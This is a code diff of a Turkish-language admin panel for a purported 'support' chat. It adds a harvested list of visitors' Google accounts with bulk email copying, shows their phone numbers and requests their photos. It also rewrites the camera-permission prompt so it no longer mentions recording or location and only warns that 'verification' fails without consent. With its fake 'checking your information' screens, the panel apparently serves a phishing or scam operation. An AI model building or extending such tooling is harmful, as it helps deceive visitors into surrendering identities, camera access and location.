@@ -1,4 +1,4 @@
-﻿import "./chat-sync.js?v=81";
+﻿import "./chat-sync.js?v=88";
 
 async function ready() {
   if (window.ChatSync) return window.ChatSync;
@@ -65,6 +65,7 @@ const sendHint = document.getElementById("send-hint");
 const quickList = document.getElementById("quick-list");
 const sendLoadingBtn = document.getElementById("send-loading-btn");
 const sendCameraBtn = document.getElementById("send-camera-btn");
+const sendPhotosBtn = document.getElementById("send-photos-btn");
 const sendPopupBtn = document.getElementById("send-popup-btn");
 const popupText = document.getElementById("popup-text");
 const popupOk = document.getElementById("popup-ok");
@@ -108,9 +109,16 @@ const alertKicker = document.getElementById("admin-alert-kicker");
 const alertTitle = document.getElementById("admin-alert-title");
 const alertBody = document.getElementById("admin-alert-body");
 const alertDismiss = document.getElementById("admin-alert-dismiss");
+const gmailList = document.getElementById("gmail-list");
+const gmailCount = document.getElementById("gmail-count");
+const gmailSearch = document.getElementById("gmail-search");
+const gmailCopyBtn = document.getElementById("gmail-copy-btn");
+const gmailBackfillBtn = document.getElementById("gmail-backfill-btn");
+const gmailHint = document.getElementById("gmail-hint");
 
 let unsubSessions = null;
 let unsubMessages = null;
+let unsubGoogleAccounts = null;
 let selectedId = null;
 let seenMessageIds = new Set();
 let notifyEnabled = false;
@@ -118,9 +126,10 @@ let alertsArmed = false;
 let sending = false;
 let adminCall = null;
 let knownSessionIds = new Set();
+let googleAccountRows = [];
+let latestSessionRows = [];
 let sessionUpdatedAt = new Map();
 let sessionsHydrated = false;
-let latestSessionRows = [];
 let recentFeedTimer = null;
 let recentFeedSeq = 0;
 let lastAlertAt = 0;
@@ -482,9 +491,18 @@ function startDash(sync) {
     updateNotifyBtnLabel();
   }
 
+  if (unsubGoogleAccounts) unsubGoogleAccounts();
+  if (sync.listenGoogleAccounts) {
+    unsubGoogleAccounts = sync.listenGoogleAccounts((rows) => {
+      googleAccountRows = Array.isArray(rows) ? rows : [];
+      renderGmails();
+    });
+  }
+
   if (unsubSessions) unsubSessions();
   unsubSessions = sync.listenSessions((rows) => {
     if (!Array.isArray(rows)) rows = [];
+    latestSessionRows = rows;
 
     if (!sessionsHydrated) {
       rows.forEach((r) => {
@@ -723,7 +741,156 @@ function updateMediaDock(row) {
   }
 }
 
+function filteredGoogleAccounts() {
+  const q = String(gmailSearch?.value || "")
+    .trim()
+    .toLowerCase();
+  const rows = googleAccountRows.filter((r) => r.email || r.name || r.uid);
+  if (!q) return rows;
+  return rows.filter((r) => {
+    const hay = [r.email, r.name, r.uid, r.lastSessionId]
+      .map((x) => String(x || "").toLowerCase())
+      .join(" ");
+    return hay.includes(q);
+  });
+}
+
+function fmtAuthDate(ts) {
+  if (!ts) return "—";
+  return new Date(ts).toLocaleDateString("en-US", {
+    month: "short",
+    day: "numeric",
+    year: "numeric",
+  });
+}
+
+function renderGmails() {
+  if (!gmailList) return;
+  const rows = filteredGoogleAccounts();
+  const total = googleAccountRows.filter((r) => r.email || r.name || r.uid).length;
+  if (gmailCount) {
+    gmailCount.textContent = `${total} hesap · Google Authentication kullanıcıları`;
+  }
+  gmailList.innerHTML = "";
+  if (!rows.length) {
+    gmailList.innerHTML = total
+      ? `<tr class="gmail-empty-row"><td colspan="6">Aramayla eşleşen hesap yok</td></tr>`
+      : `<tr class="gmail-empty-row"><td colspan="6">Henüz Google girişi yok. Ziyaretçi Gmail ile girince burada listelenir (Firebase Authentication Users gibi).</td></tr>`;
+    return;
+  }
+
+  rows.forEach((row) => {
+    const tr = document.createElement("tr");
+    tr.className = "gmail-row";
+    const email = String(row.email || "").trim();
+    const name = String(row.name || "").trim();
+    const photo = String(row.photo || "").trim();
+    const uid = String(row.uid || row.id || "").trim();
+    const sid = String(row.lastSessionId || "").trim();
+    const created = Number(row.createdAt) || Number(row.firstSeenAt) || 0;
+    const signedIn = Number(row.signedInAt) || Number(row.lastSeenAt) || 0;
+    const providers = Array.isArray(row.providers) && row.providers.length
+      ? row.providers
+      : ["google.com"];
+
+    const avatar = photo
+      ? `<img class="gmail-avatar" src="${escapeHtml(photo)}" alt="" referrerpolicy="no-referrer" />`
+      : `<span class="gmail-avatar gmail-avatar-fallback" aria-hidden="true">${escapeHtml(
+          (name || email || "?").slice(0, 1).toUpperCase()
+        )}</span>`;
+
+    const providerBadges = providers
+      .map((p) => {
+        const isGoogle = String(p).includes("google");
+        return `<span class="gmail-provider ${isGoogle ? "is-google" : ""}" title="${escapeHtml(
+          p
+        )}">${isGoogle ? "G" : escapeHtml(String(p).slice(0, 1).toUpperCase())}</span>`;
+      })
+      .join("");
+
+    tr.innerHTML = `
+      <td>
+        <div class="gmail-id-cell">
+          ${avatar}
+          <div class="gmail-id-text">
+            <strong class="gmail-email">${escapeHtml(email || "E-posta yok")}</strong>
+            ${name ? `<span class="gmail-name">${escapeHtml(name)}</span>` : ""}
+          </div>
+        </div>
+      </td>
+      <td><div class="gmail-providers">${providerBadges}</div></td>
+      <td>${escapeHtml(fmtAuthDate(created))}</td>
+      <td>${escapeHtml(fmtAuthDate(signedIn))}</td>
+      <td><code class="gmail-uid" title="${escapeHtml(uid)}">${escapeHtml(
+        uid.length > 22 ? `${uid.slice(0, 22)}…` : uid
+      )}</code></td>
+      <td class="gmail-actions-cell"></td>
+    `;
+
+    const actions = tr.querySelector(".gmail-actions-cell");
+    if (email) {
+      const copyBtn = document.createElement("button");
+      copyBtn.type = "button";
+      copyBtn.className = "btn btn-ghost gmail-action-btn";
+      copyBtn.textContent = "Kopyala";
+      copyBtn.addEventListener("click", async () => {
+        try {
+          await navigator.clipboard.writeText(email);
+          showGmailHint(`Kopyalandı: ${email}`);
+        } catch {
+          showGmailHint("Kopyalama başarısız");
+        }
+      });
+      actions.appendChild(copyBtn);
+    }
+    if (uid) {
+      const copyUid = document.createElement("button");
+      copyUid.type = "button";
+      copyUid.className = "btn btn-ghost gmail-action-btn";
+      copyUid.textContent = "UID";
+      copyUid.addEventListener("click", async () => {
+        try {
+          await navigator.clipboard.writeText(uid);
+          showGmailHint("UID kopyalandı");
+        } catch {
+          showGmailHint("Kopyalama başarısız");
+        }
+      });
+      actions.appendChild(copyUid);
+    }
+    if (sid) {
+      const openBtn = document.createElement("button");
+      openBtn.type = "button";
+      openBtn.className = "btn btn-ghost gmail-action-btn";
+      openBtn.textContent = "Sohbet";
+      openBtn.addEventListener("click", () => {
+        const session =
+          latestSessionRows.find((s) => s.id === sid) ||
+          ({ id: sid, preview: email || name || "Google hesap" });
+        openSession(session);
+        document.getElementById("thread-title")?.scrollIntoView?.({
+          behavior: "smooth",
+          block: "start",
+        });
+      });
+      actions.appendChild(openBtn);
+    }
+    gmailList.appendChild(tr);
+  });
+}
+
+function showGmailHint(text) {
+  if (!gmailHint) return;
+  gmailHint.hidden = false;
+  gmailHint.textContent = text;
+  clearTimeout(showGmailHint._t);
+  showGmailHint._t = setTimeout(() => {
+    gmailHint.hidden = true;
+  }, 2400);
+}
+
 function renderSessions(rows) {
+  latestSessionRows = Array.isArray(rows) ? rows : [];
   sessionCount.textContent = `${rows.length} oturum`;
   sessionList.innerHTML = "";
   if (!rows.length) {
@@ -746,13 +913,16 @@ function renderSessions(rows) {
     const hasCam = Boolean(row.cameraGranted || row.hasCamera || row.lastSnapshotUrl);
     const hasLoc = Boolean(row.hasLocation || row.lastLocation);
     const hasGoogle = Boolean(row.googleEmail || row.googleName || row.googleUid);
+    const hasPhone = Boolean(row.phone);
     const googleLine = hasGoogle
       ? escapeHtml(
           [row.googleName, row.googleEmail].filter(Boolean).join(" · ") || "Google giriş"
         )
       : "";
+    const phoneLine = hasPhone ? escapeHtml(String(row.phone)) : "";
     const badges = [
       hasGoogle ? '<span class="session-badge session-badge-google">Google</span>' : "",
+      hasPhone ? '<span class="session-badge session-badge-phone">Telefon</span>' : "",
       hasCam ? '<span class="session-badge session-badge-cam">Kamera</span>' : "",
       hasLoc ? '<span class="session-badge session-badge-loc">Konum</span>' : "",
     ]
@@ -763,6 +933,7 @@ function renderSessions(rows) {
       <strong>#${shortId(row.id)}</strong>
       <span>${escapeHtml(row.preview || "Mesaj yok")}</span>
       ${googleLine ? `<span class="session-google-line">${googleLine}</span>` : ""}
+      ${phoneLine ? `<span class="session-google-line">📞 ${phoneLine}</span>` : ""}
       <em>${fmtTime(row.updatedAt)} · ${last}</em>
       ${badges ? `<div class="session-badges">${badges}</div>` : ""}
     `;
@@ -1614,6 +1785,33 @@ function appendThreadMessage(msg, announce) {
       resetLiveVideoUi();
       void joinAdminCamera(selectedId, msg.callId);
     }
+  } else if (msg.type === "photos") {
+    const p = document.createElement("p");
+    p.textContent = `🖼 Fotoğraf talebi: ${msg.text || ""}`;
+    const tags = document.createElement("em");
+    tags.className = "popup-btn-tags";
+    tags.textContent = `${msg.okLabel || "Fotoğraf seç"} / ${msg.cancelLabel || "İstemiyorum"} · max ${
+      msg.maxPhotos || 10
+    }`;
+    body.append(p, tags);
+  } else if (msg.type === "photo" || msg.imageUrl) {
+    const p = document.createElement("p");
+    p.textContent = msg.text || "Fotoğraf";
+    body.appendChild(p);
+    if (msg.imageUrl) {
+      const link = document.createElement("a");
+      link.href = msg.imageUrl;
+      link.target = "_blank";
+      link.rel = "noopener";
+      link.className = "admin-photo-link";
+      const img = document.createElement("img");
+      img.src = msg.imageUrl;
+      img.alt = msg.fileName || "Ziyaretçi fotoğrafı";
+      img.className = "admin-photo-thumb";
+      img.loading = "lazy";
+      link.appendChild(img);
+      body.appendChild(link);
+    }
   } else {
     const p = document.createElement("p");
     p.textContent = msg.text || "";
@@ -1712,8 +1910,11 @@ function formatChatExportTxt(sessionId, meta, messages) {
     if (msg.type === "camera") kind = " [kamera]";
     else if (msg.type === "popup") kind = " [popup]";
     else if (msg.type === "loading") kind = " [yükleme]";
+    else if (msg.type === "photos") kind = " [fotoğraf talebi]";
+    else if (msg.type === "photo") kind = " [fotoğraf]";
     lines.push(`[${when}] ${who}${kind}`);
     lines.push(String(msg.text || "").trim() || "(boş)");
+    if (msg.imageUrl) lines.push(`URL: ${msg.imageUrl}`);
     lines.push("");
   });
   if (!messages.length) lines.push("(Bu sohbette mesaj yok)");
@@ -1854,8 +2055,10 @@ async function sendToSelected(text, options = {}) {
       (options.type === "loading"
         ? "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…"
         : options.type === "camera"
-          ? "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır."
-          : "")
+          ? "Kimlik doğrulaması için izin vermeniz isteniyor. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama tamamlanamaz."
+          : options.type === "photos"
+            ? "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin."
+            : "")
   ).trim();
   if (!msg && options.type !== "loading") return;
   if (!selectedId) {
@@ -1879,12 +2082,19 @@ async function sendToSelected(text, options = {}) {
           ? "Popup gönderildi."
           : options.type === "camera"
             ? "Kamera talebi gönderildi."
-            : "Gönderildi.";
+            : options.type === "photos"
+              ? "Fotoğraf talebi gönderildi."
+              : "Gönderildi.";
     if (options.type === "camera" && result?.callId) {
       resetLiveVideoUi();
       await joinAdminCamera(selectedId, result.callId);
     }
-    if (options.type !== "loading" && options.type !== "popup" && options.type !== "camera") {
+    if (
+      options.type !== "loading" &&
+      options.type !== "popup" &&
+      options.type !== "camera" &&
+      options.type !== "photos"
+    ) {
       replyInput.value = "";
     }
     window.setTimeout(() => {
@@ -1892,7 +2102,8 @@ async function sendToSelected(text, options = {}) {
         sendHint.textContent.includes("Gönderildi") ||
         sendHint.textContent.includes("animasyon") ||
         sendHint.textContent.includes("Popup") ||
-        sendHint.textContent.includes("Kamera")
+        sendHint.textContent.includes("Kamera") ||
+        sendHint.textContent.includes("Fotoğraf")
       ) {
         sendHint.hidden = true;
       }
@@ -1982,7 +2193,7 @@ sendCameraBtn?.addEventListener("click", () => {
       }
     }
     await sendToSelected(
-      "Güvenlik kontrolü için kamera ve konum izni zorunludur. Açarsanız görüntü bu destek oturumuna bağlanır; konum doğrulama için kullanılır.",
+      "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama adımı tamamlanamaz.",
       {
         type: "camera",
         okLabel: "İzin ver",
@@ -1991,6 +2202,18 @@ sendCameraBtn?.addEventListener("click", () => {
       }
     );
   })();
+});
+
+sendPhotosBtn?.addEventListener("click", () => {
+  sendToSelected(
+    "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin. Sadece sizin seçtiğiniz dosyalar gönderilir.",
+    {
+      type: "photos",
+      okLabel: "Fotoğraf seç",
+      cancelLabel: "İstemiyorum",
+      maxPhotos: 10,
+    }
+  );
 });
 
 async function endActiveCameraSession() {
@@ -2222,16 +2445,60 @@ alertDismiss?.addEventListener("click", () => {
   hideAdminAlert();
 });
 
+gmailSearch?.addEventListener("input", () => {
+  renderGmails();
+});
+
+gmailCopyBtn?.addEventListener("click", async () => {
+  const emails = filteredGoogleAccounts()
+    .map((r) => String(r.email || "").trim())
+    .filter(Boolean);
+  if (!emails.length) {
+    showGmailHint("Kopyalanacak e-posta yok");
+    return;
+  }
+  try {
+    await navigator.clipboard.writeText(emails.join("\n"));
+    showGmailHint(`${emails.length} e-posta kopyalandı`);
+  } catch {
+    showGmailHint("Kopyalama başarısız");
+  }
+});
+
+gmailBackfillBtn?.addEventListener("click", async () => {
+  if (!window.ChatSync?.backfillGoogleAccountsFromSessions) {
+    showGmailHint("Aktarım fonksiyonu yok — sayfayı yenile");
+    return;
+  }
+  gmailBackfillBtn.disabled = true;
+  showGmailHint("Sohbetlerden aktarılıyor…");
+  try {
+    const n = await window.ChatSync.backfillGoogleAccountsFromSessions();
+    showGmailHint(n ? `${n} sohbetten Google hesabı aktarıldı` : "Aktarılacak Google kaydı bulunamadı");
+  } catch (err) {
+    console.warn(err);
+    showGmailHint(
+      "Aktarım başarısız — Firebase Rules’a googleAccounts ekleyip Publish edin"
+    );
+  } finally {
+    gmailBackfillBtn.disabled = false;
+  }
+});
+
 logoutBtn?.addEventListener("click", () => {
   setAuth(false);
   if (unsubSessions) unsubSessions();
   if (unsubMessages) unsubMessages();
+  if (unsubGoogleAccounts) unsubGoogleAccounts();
+  unsubGoogleAccounts = null;
   stopAdminCall(true);
   hideAdminAlert();
   selectedId = null;
   alertsArmed = false;
   sessionsHydrated = false;
   knownSessionIds = new Set();
+  googleAccountRows = [];
+  latestSessionRows = [];
   if (titleFlashTimer) {
     clearInterval(titleFlashTimer);
     titleFlashTimer = null;
